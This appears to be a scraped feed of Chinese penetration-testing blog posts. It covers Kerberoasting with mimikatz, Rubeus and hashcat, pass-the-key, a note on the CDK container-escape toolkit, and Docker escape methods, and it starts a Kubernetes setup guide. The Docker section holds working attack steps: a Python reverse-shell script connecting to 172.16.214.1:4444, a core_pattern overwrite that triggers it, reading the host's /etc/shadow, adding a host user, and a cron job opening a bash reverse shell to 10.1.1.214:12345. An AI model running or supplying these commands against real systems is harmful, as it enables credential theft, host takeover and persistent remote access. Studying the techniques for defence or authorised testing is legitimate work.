class="line">serviceclass/host:port/servicename</span><br></pre></td></tr></table></figure><ul><li>serviceclass可以理解为服务的名称，常见的有www, ldap, SMTP, DNS, HOST等</li><li>host有两种形式，FQDN和NetBIOS名，例如server01.test.com和server01</li><li>如果服务运行在默认端口上，则端口号(port)可以省略</li></ul><p>查询SPN<br>对域控制器发起LDAP查询，这是正常kerberos票据行为的一部分，因此查询SPN的操作很难被检测<br>(1) 使用SetSPN<br>查看当前域内的所有SPN：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell setspn -q <span class="strong">*/*</span></span><br></pre></td></tr></table></figure><p>查看test域内的所有SPN：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell setspn -T test -q <span class="strong">*/*</span></span><br></pre></td></tr></table></figure><p>输出示例：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">CN=DC1,OU=Domain Controllers,DC=test,DC=com</span><br><span class="line">        exchangeRFR/DC1</span><br><span class="line">        exchangeRFR/DC1<span class="selector-class">.test</span><span class="selector-class">.com</span></span><br><span class="line">        exchangeMDB/DC1<span class="selector-class">.test</span><span class="selector-class">.com</span></span><br><span class="line">        exchangeMDB/DC1</span><br><span class="line">        exchangeAB/DC1</span><br><span class="line">        exchangeAB/DC1<span class="selector-class">.test</span><span class="selector-class">.com</span></span><br><span class="line">        SMTP/DC1</span><br><span class="line">        SMTP/DC1<span class="selector-class">.test</span><span class="selector-class">.com</span></span><br><span class="line">        SmtpSvc/DC1</span><br><span class="line">        SmtpSvc/DC1<span class="selector-class">.test</span><span class="selector-class">.com</span></span><br><span class="line">        ldap/DC1<span class="selector-class">.test</span>.com/ForestDnsZones<span class="selector-class">.test</span><span class="selector-class">.com</span></span><br><span class="line">        ldap/DC1<span class="selector-class">.test</span>.com/DomainDnsZones<span class="selector-class">.test</span><span class="selector-class">.com</span></span><br><span class="line">        Dfsr-<span class="number">12</span>F9A27C-BF97-<span class="number">4787</span>-<span class="number">9364</span>-D31B6C55EB04/DC1<span class="selector-class">.test</span><span class="selector-class">.com</span></span><br><span class="line">        DNS/DC1<span class="selector-class">.test</span><span class="selector-class">.com</span></span><br><span class="line">        GC/DC1<span class="selector-class">.test</span>.com/test<span class="selector-class">.com</span></span><br><span class="line">        RestrictedKrbHost/DC1<span class="selector-class">.test</span><span class="selector-class">.com</span></span><br><span class="line">        RestrictedKrbHost/DC1</span><br><span class="line">        HOST/DC1/TEST</span><br><span class="line">        HOST/DC1<span class="selector-class">.test</span>.com/TEST</span><br><span class="line">        HOST/DC1</span><br><span class="line">        HOST/DC1<span class="selector-class">.test</span><span class="selector-class">.com</span></span><br><span class="line">        HOST/DC1<span class="selector-class">.test</span>.com/test<span class="selector-class">.com</span></span><br><span class="line">        E3514235-<span class="number">4</span>B06-<span class="number">11</span>D1-AB04-<span class="number">00</span>C04FC2DCD2/<span class="number">0</span>f33253b-<span class="number">2314</span>-<span class="number">40</span>f0-b665-f4317b13e6b9/test<span class="selector-class">.com</span></span><br><span class="line">        ldap/DC1/TEST</span><br><span class="line">        ldap/<span class="number">0</span>f33253b-<span class="number">2314</span>-<span class="number">40</span>f0-b665-f4317b13e6b9._msdcs<span class="selector-class">.test</span><span class="selector-class">.com</span></span><br><span class="line">        ldap/DC1<span class="selector-class">.test</span>.com/TEST</span><br><span class="line">        ldap/DC1</span><br><span class="line">        ldap/DC1<span class="selector-class">.test</span><span class="selector-class">.com</span></span><br><span class="line">        ldap/DC1<span class="selector-class">.test</span>.com/test<span class="selector-class">.com</span></span><br><span class="line">CN=krbtgt,CN=Users,DC=test,DC=com</span><br><span class="line">        kadmin/changepw</span><br><span class="line">CN=COMPUTER01,CN=Computers,DC=test,DC=com</span><br><span class="line">        RestrictedKrbHost/COMPUTER01</span><br><span class="line">        HOST/COMPUTER01</span><br><span class="line">        RestrictedKrbHost/COMPUTER01<span class="selector-class">.test</span><span class="selector-class">.com</span></span><br><span class="line">        HOST/COMPUTER01<span class="selector-class">.test</span><span class="selector-class">.com</span></span><br><span class="line">CN=MSSQL Service Admin,CN=Users,DC=test,DC=com</span><br><span class="line">        MSSQLSvc/DC1<span class="selector-class">.test</span>.com</span><br></pre></td></tr></table></figure><p>以CN开头的每一行代表一个帐户，其下的信息是与该帐户相关联的SPN<br>对于上面的输出数据，机器帐户(Computers)为：</p><ul><li>CN&#x3D;DC1,OU&#x3D;Domain Controllers,DC&#x3D;test,DC&#x3D;com</li><li>CN&#x3D;COMPUTER01,CN&#x3D;Computers,DC&#x3D;test,DC&#x3D;com</li></ul><p>域用户帐户(Users)为：</p><ul><li>CN&#x3D;krbtgt,CN&#x3D;Users,DC&#x3D;test,DC&#x3D;com</li><li>CN&#x3D;MSSQL Service Admin,CN&#x3D;Users,DC&#x3D;test,DC&#x3D;com</li></ul><p>注册在域用户帐户(Users)下的SPN有两个：<strong>kadmin&#x2F;changepw</strong>和<strong>MSSQLSvc&#x2F;DC1.test.com</strong></p><p>域内的任何一台主机，都能够通过查询SPN，向域内的所有服务请求TGS，拿到TGS后对其进行暴力破解</p><p>对于破解出的明文口令，只有域用户帐户(Users)的口令存在价值，不必考虑机器帐户的口令(无法用于远程连接)</p><p>因此，高效率的利用思路如下：</p><p>1,查询SPN，找到有价值的SPN，需要满足以下条件：</p><ul><li>该SPN注册在域用户帐户(Users)下</li><li>域用户账户的权限很高</li></ul><p>2,请求TGS<br>3,导出TGS<br>4,暴力破解</p><h3 id="Kerberoasting的实现方法一（手动检测）"><a href="#Kerberoasting的实现方法一（手动检测）" class="headerlink" title="Kerberoasting的实现方法一（手动检测）"></a>Kerberoasting的实现方法一（手动检测）</h3><p>需要满足以下条件：</p><ul><li>该SPN注册在域用户帐户(Users)下</li><li>域用户账户的权限很高</li></ul><p>手动原理：<br>先使用spn去获取那些通讯的服务<br>再去连接通讯这个服务，产生票据<br>查看票据的加密通讯类型判断能不能爆破<br>1、使用SetSPN<br>查看当前域内的所有SPN：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell setspn -q <span class="strong">*/*</span></span><br></pre></td></tr></table></figure><p>2、请求TGS<br>(1)请求指定TGS</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$SPNName</span> = <span class="string">&#x27;MSSQLSvc/DC1.test.com&#x27;</span></span><br><span class="line">powershell <span class="built_in">Add-Type</span> <span class="literal">-AssemblyNAme</span> System.IdentityModel</span><br><span class="line">powershell <span class="built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span class="literal">-ArgumentList</span> <span class="variable">$SPNName</span></span><br><span class="line">或者：</span><br><span class="line">mimikatz kerberos::ask /target:MSSQLSvc/DC1.test.com</span><br></pre></td></tr></table></figure><p>(2)请求所有TGS</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Add-Type</span> <span class="literal">-AssemblyName</span> System.IdentityModel  </span><br><span class="line">setspn.exe <span class="literal">-q</span> */* | <span class="built_in">Select-String</span> <span class="string">&#x27;^CN&#x27;</span> <span class="literal">-Context</span> <span class="number">0</span>,<span class="number">1</span> | % &#123; <span class="built_in">New-Object</span> System. IdentityModel.Tokens.KerberosRequestorSecurityToken <span class="literal">-ArgumentList</span> <span class="variable">$_</span>.Context.PostContext[<span class="number">0</span>].Trim() &#125;  </span><br></pre></td></tr></table></figure><p>执行后输入klist查看内存中的票据，可找到获得的TGS<br>3、导出<br>使用mimikatz</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list /<span class="keyword">export</span></span><br></pre></td></tr></table></figure><p>4、破解<br><a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a><br>文件票据：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tgsrepcrack.py pass.txt test.kirbi</span><br></pre></td></tr></table></figure><p>HASH密文：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 hash.txt pass.txt --force</span><br></pre></td></tr></table></figure><h3 id="Kerberoasting的实现方法二（工具）"><a href="#Kerberoasting的实现方法二（工具）" class="headerlink" title="Kerberoasting的实现方法二（工具）"></a>Kerberoasting的实现方法二（工具）</h3><p>工具：<br>1,impacket-getuserspns<br>请求所有SPN服务器，并找到能破解的票据格式保存到hash.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GetUserSPNs.py -request -dc-ip <span class="number">192.168</span><span class="number">.3</span><span class="number">.32</span> 域名/账户:密码 -outputfile <span class="built_in">hash</span>.txt</span><br></pre></td></tr></table></figure><p>2,Rubeus<br><a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">TGS包直接打印能够使用John或hashcat能够破解的Hash。</span></span><br><span class="line">Rubeus.exe kerberoast /format:john /outfile:kerberoasting.txt</span><br></pre></td></tr></table></figure><h1 id="PTK"><a href="#PTK" class="headerlink" title="PTK"></a>PTK</h1><p>pass the key （密钥传递攻击）<br>PTK（pass the key ） #利用的ekeys aes256进行的渗透测试（NTLM认证攻击）<br>当系统安装了KB2871997补丁且禁用了NTLM的时候，那我们抓取到的ntlm hash失去了作用，但是可以通过PTK的攻击方式获取权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::ekeys</span><br><span class="line">mimikatz sekurlsa:pth /user:域用户名 /doamin:域名 /aes256:aes256值</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云攻防-自动化工具CDK</title>
      <link href="/2025/06/17/%E4%BA%91%E6%94%BB%E9%98%B2-%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7CDK/"/>
      <url>/2025/06/17/%E4%BA%91%E6%94%BB%E9%98%B2-%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7CDK/</url>
      
        <content type="html"><![CDATA[<h1 id="云攻防-自动化工具CDK"><a href="#云攻防-自动化工具CDK" class="headerlink" title="云攻防-自动化工具CDK"></a>云攻防-自动化工具CDK</h1><p><a href="https://github.com/cdk-team/CDK">https://github.com/cdk-team/CDK</a></p><p>概述</p><p>CDK 是一个开源的容器渗透工具包，旨在提供对各种精简容器的稳定利用，且无需依赖任何操作系统。它配备了实用的网络工具和许多强大的 PoC&#x2F;EXP，可帮助您轻松脱离容器并接管 K8s 集群。</p>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云原生-docker</title>
      <link href="/2025/06/17/%E4%BA%91%E6%94%BB%E9%98%B2-%E4%BA%91%E5%8E%9F%E7%94%9F-docker/"/>
      <url>/2025/06/17/%E4%BA%91%E6%94%BB%E9%98%B2-%E4%BA%91%E5%8E%9F%E7%94%9F-docker/</url>
      
        <content type="html"><![CDATA[<h1 id="云原生-docker"><a href="#云原生-docker" class="headerlink" title="云原生-docker"></a>云原生-docker</h1><p>拿到权限：判断是否为容器</p><p><a href="https://blog.csdn.net/qq_23936389/article/details/131486643">https://blog.csdn.net/qq_23936389/article/details/131486643</a></p><p>三种安全容器逃逸：</p><ul><li>特权模式启动导致（不安全启动 适用于 java jsp 高权限无需提权 还要提权才能逃<br>逸）</li><li>危险挂载启动导致（危险启动 适用于 java jsp 高权限无需提权 还要提权才能逃逸）<br>-docker 自身 &amp; 系统漏洞（软件漏洞和系统漏洞 都可用）<br><a href="https://wiki.teamssix.com/cloudnative/">https://wiki.teamssix.com/cloudnative/</a></li></ul><h2 id="容器逃逸-特权模式"><a href="#容器逃逸-特权模式" class="headerlink" title="容器逃逸 - 特权模式"></a>容器逃逸 - 特权模式</h2><p><a href="https://wiki.teamssix.com/CloudNative/Docker/docker-privileged-escape.html">https://wiki.teamssix.com/CloudNative/Docker/docker-privileged-escape.html</a></p><p>启动 docker 容器：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --rm --privileged=true -it alpine  //启用--privileged=true，container内的root拥有真正的root权限，可能让攻击者利用此进行容器逃逸</span><br></pre></td></tr></table></figure><p>判断是否为容器环境：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/1/cgroup | grep -qi docker &amp;&amp; echo &quot;Is Docker&quot; || echo &quot;Not Docker&quot;</span><br></pre></td></tr></table></figure><p>如果返回 Is Docker，说明当前是 Docker 容器环境，反之亦然。</p><p>判断特权模式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/self/status | grep -qi &quot;0000003fffffffff&quot; &amp;&amp; echo &quot;Is privileged mode&quot; || echo &quot;Not privileged mode&quot;</span><br><span class="line">或者</span><br><span class="line">cat /proc/self/status | grep CapEff </span><br></pre></td></tr></table></figure><p>在容器内部执行下面的命令，从而判断容器是不是特权模式，如果是以特权模式启动的话，CapEff 对应的掩码值应该为 0000003fffffffff 或者是 0000001fffffffff</p><p>方法一：</p><p>查看挂载磁盘设备：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure><p>在容器内部执行以下命令，将宿主机文件挂载到 &#x2F;test 目录下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /test &amp;&amp; mount /dev/sda1 /test</span><br></pre></td></tr></table></figure><p>尝试访问宿主机 shadow 文件，可以看到正常访问</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /test/etc/shadow</span><br></pre></td></tr></table></figure><p>方法二</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/sda1 /mnt</span><br><span class="line">chroot /mnt adduser john</span><br></pre></td></tr></table></figure><p>通过新添加的用户登录</p><h2 id="容器逃逸-挂载-逃逸"><a href="#容器逃逸-挂载-逃逸" class="headerlink" title="容器逃逸 - 挂载 逃逸"></a>容器逃逸 - 挂载 逃逸</h2><p><a href="https://wiki.teamssix.com/CloudNative/Docker/docker-procfs-escape.html">https://wiki.teamssix.com/CloudNative/Docker/docker-procfs-escape.html</a></p><p>启动容器：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu //procfs</span><br><span class="line">docker run -itd --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock ubuntu //Socket</span><br></pre></td></tr></table></figure><h2 id="挂载-Docker-Socket-逃逸-："><a href="#挂载-Docker-Socket-逃逸-：" class="headerlink" title="挂载 Docker Socket 逃逸 ："></a>挂载 Docker Socket 逃逸 ：</h2><p>执行以下命令，如果返回 Docker Socket is mounted. 说明当前挂载了 Docker Socket</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls /var/run/ | grep -qi docker.sock &amp;&amp; echo &quot;Docker Socket is mounted.&quot; || echo &quot;Docker Socket is not mounted.&quot;</span><br><span class="line">ls -lah /var/run/docker.sock</span><br></pre></td></tr></table></figure><p>在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v /:/host ubuntu /bin/bash</span><br></pre></td></tr></table></figure><p>在新的容器内执行 chroot，将根目录切换到挂载到宿主机的根目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chroot /host</span><br></pre></td></tr></table></figure><h2 id="挂载-procfs-逃逸-："><a href="#挂载-procfs-逃逸-：" class="headerlink" title="挂载 procfs 逃逸 ："></a>挂载 procfs 逃逸 ：</h2><p>执行以下命令，如果返回 Procfs is mounted. 说明当前挂载了 procfs</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name core_pattern 2&gt;/dev/null | wc -l | grep -q 2 &amp;&amp; echo &quot;Procfs is mounted.&quot; || echo &quot;Procfs is not mounted.&quot;</span><br></pre></td></tr></table></figure><p>如果找到两个 core_pattern 文件，那可能就是挂载了宿主机的 procfs</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name core_pattern</span><br></pre></td></tr></table></figure><p>找到当前容器在宿主机下的绝对路径</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/mounts | xargs -d &#x27;,&#x27; -n 1 | grep workdir</span><br><span class="line">//为绝对路/var/lib/docker/overlay2/5717cb9154218ec49579ae338cd1c236694d6a377d61fd6d17e11e49d1b1baad/merged</span><br></pre></td></tr></table></figure><p>安装 vim 和 gcc</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update -y &amp;&amp; apt-get install vim gcc -y</span><br><span class="line">vim /tmp/.t.py</span><br></pre></td></tr></table></figure><p>创建一个反弹 Shell 的 py 脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/usr/bin/python3</span></span><br><span class="line">import  os</span><br><span class="line">import pty</span><br><span class="line">import socket</span><br><span class="line">lhost = &quot;172.16.214.1&quot;</span><br><span class="line">lport = 4444</span><br><span class="line">def main():</span><br><span class="line">   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">   s.connect((lhost, lport))</span><br><span class="line">   os.dup2(s.fileno(), 0)</span><br><span class="line">   os.dup2(s.fileno(), 1)</span><br><span class="line">   os.dup2(s.fileno(), 2)</span><br><span class="line">   os.putenv(&quot;HISTFILE&quot;, &#x27;/dev/null&#x27;)</span><br><span class="line">   pty.spawn(&quot;/bin/bash&quot;)</span><br><span class="line"><span class="meta prompt_">   # </span><span class="language-bash">os.remove(<span class="string">&#x27;/tmp/.t.py&#x27;</span>)</span></span><br><span class="line">   s.close()</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">   main()</span><br></pre></td></tr></table></figure><p>给 Shell 赋予执行权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 .t.py</span><br></pre></td></tr></table></figure><p>写入反弹 shell 到目标的 proc 目录下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;|/var/lib/docker/overlay2/5717cb9154218ec49579ae338cd1c236694d6a377d61fd6d17e11e49d1b1baad/merged/tmp/.t.py \rcore    &quot; &gt;  /host/proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure><p>在攻击主机上开启一个监听，然后在容器里运行一个可以崩溃的程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vim t.c</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include&lt;stdio.h&gt;</span></span><br><span class="line">int main(void)  &#123;</span><br><span class="line">   int *a  = NULL;</span><br><span class="line">   *a = 1;</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br><span class="line">gcc t.c -o t</span><br><span class="line">./t</span><br></pre></td></tr></table></figure><h2 id="Docker-远程-API-未授权访问逃逸"><a href="#Docker-远程-API-未授权访问逃逸" class="headerlink" title="Docker 远程 API 未授权访问逃逸"></a>Docker 远程 API 未授权访问逃逸</h2><p>docker remote api 可以执行 docker 命令，docker 守护进程监听在 0.0.0.0，可直接调用 API 来操作 docker</p><p>将 docker 守护进程监听在 0.0.0.0</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375</span><br></pre></td></tr></table></figure><p>检测：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IP=`hostname -i | awk -F. &#x27;&#123;print $1 &quot;.&quot; $2 &quot;.&quot; $3 &quot;.1&quot;&#125;&#x27; ` &amp;&amp; wget http://$IP:2375</span><br></pre></td></tr></table></figure><p>如果返回 404 说明存在</p><p>列出容器信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://&lt;target&gt;:2375/containers/json</span><br></pre></td></tr></table></figure><p>查看容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://&lt;target&gt;:2375 ps -a</span><br></pre></td></tr></table></figure><p>新运行一个容器，挂载点设置为服务器的根目录挂载至 &#x2F;mnt 目录下。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://10.1.1.211:2375 run -it -v /:/mnt nginx:latest /bin/bash</span><br></pre></td></tr></table></figure><p>在容器内执行命令，将反弹 shell 的脚本写入到 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;* * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.1.1.214/12345 0&gt;&amp;1&#x27; &gt;&gt; /mnt/var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure><p>本地监听端口，获取对方宿主机 shell。</p>]]></content>
      
      
      <categories>
          
          <category> 云安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 云安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云攻防-K8S搭建</title>
      <link href="/2025/06/17/%E4%BA%91%E6%94%BB%E9%98%B2-k8s%E6%90%AD%E5%BB%BA/"/>
      <url>/2025/06/17/%E4%BA%91%E6%94%BB%E9%98%B2-k8s%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="云攻防-k8s手动搭建"><a href="#云攻防-k8s手动搭建" class="headerlink" title="云攻防-k8s手动搭建"></a>云攻防-k8s手动搭建</h1><p>参考视频：<br><a href="https://www.bilibili.com/video/BV1P17fzBES1?spm_id_from=333.788.videopod.episodes&vd_source=89bf25153801ebc942aaf90aa2af1675&p=5">https://www.bilibili.com/video/BV1P17fzBES1?spm_id_from=333.788.videopod.episodes&amp;vd_source=89bf25153801ebc942aaf90aa2af1675&amp;p=5</a><br>看官网搭建：<br><a href="https://kubernetes.io/zh-cn/docs/tasks/tools/install-kubectl-linux/">https://kubernetes.io/zh-cn/docs/tasks/tools/install-kubectl-linux/</a></p><p>国内网络环境 优化的 CentOS 7 部署 Kubernetes 集群详细步骤,及常见问题</p><h2 id="一、环境准备（所有节点执行）"><a href="#一、环境准备（所有节点执行）" class="headerlink" title="一、环境准备（所有节点执行）"></a>一、环境准备（所有节点执行）</h2><h3 id="1-配置主机名与-hosts-解析"><a href="#1-配置主机名与-hosts-解析" class="headerlink" title="1. 配置主机名与 hosts 解析"></a>1. 配置主机名与 hosts 解析</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Master 节点</span></span><br><span class="line">hostnamectl set-hostname k8s-master</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Worker 节点（如 node1）</span></span><br><span class="line">hostnamectl set-hostname k8s-node1</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">所有节点编辑 /etc/hosts</span></span><br><span class="line">cat &lt;&lt;EOF &gt;&gt; /etc/hosts</span><br><span class="line">&lt;Master节点内网IP&gt; k8s-master</span><br><span class="line">&lt;Worker节点内网IP&gt; k8s-node1</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><h3 id="2-关闭防火墙、SELinux-和-Swap"><a href="#2-关闭防火墙、SELinux-和-Swap" class="headerlink" title="2. 关闭防火墙、SELinux 和 Swap"></a>2. 关闭防火墙、SELinux 和 Swap</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop firewalld &amp;&amp; systemctl disable firewalld</span><br><span class="line">setenforce 0</span><br><span class="line">sed -i &#x27;s/^SELINUX=enforcing$/SELINUX=permissive/&#x27; /etc/selinux/config</span><br><span class="line">swapoff -a</span><br><span class="line">sed -i &#x27;/ swap / s/^\(.*\)$/#\1/g&#x27; /etc/fstab  # 永久关闭 Swap</span><br></pre></td></tr></table></figure><h3 id="3-配置内核参数"><a href="#3-配置内核参数" class="headerlink" title="3. 配置内核参数"></a>3. 配置内核参数</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt;EOF &gt; /etc/sysctl.d/k8s.conf</span><br><span class="line">net.bridge.bridge-nf-call-ip6tables = 1</span><br><span class="line">net.bridge.bridge-nf-call-iptables = 1</span><br><span class="line">net.ipv4.ip_forward = 1</span><br><span class="line">EOF</span><br><span class="line">sysctl --system</span><br></pre></td></tr></table></figure><h3 id="4-加载内核模块"><a href="#4-加载内核模块" class="headerlink" title="4. 加载内核模块"></a>4. 加载内核模块</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">modprobe br_netfilter</span><br><span class="line">modprobe overlay</span><br></pre></td></tr></table></figure><h2 id="二、安装容器运行时（所有节点执行）"><a href="#二、安装容器运行时（所有节点执行）" class="headerlink" title="二、安装容器运行时（所有节点执行）"></a>二、安装容器运行时（所有节点执行）</h2><p>CentOS 7 yum 无法使用</p><p>CentOS 7 仓库已经被归档，当前的镜像地址无法找到所需的文件。CentOS 7 的官方支持已经结束，部分仓库已被移至归档库。这导致了 yum 命令无法找到所需的元数据文件。CentOS 7 的官方仓库在 2024 年 6 月 30 日之后已经停止维护。因此，使用最新的 CentOS 7 官方仓库可能会遇到问题。</p><p>参考文章：</p><p><a 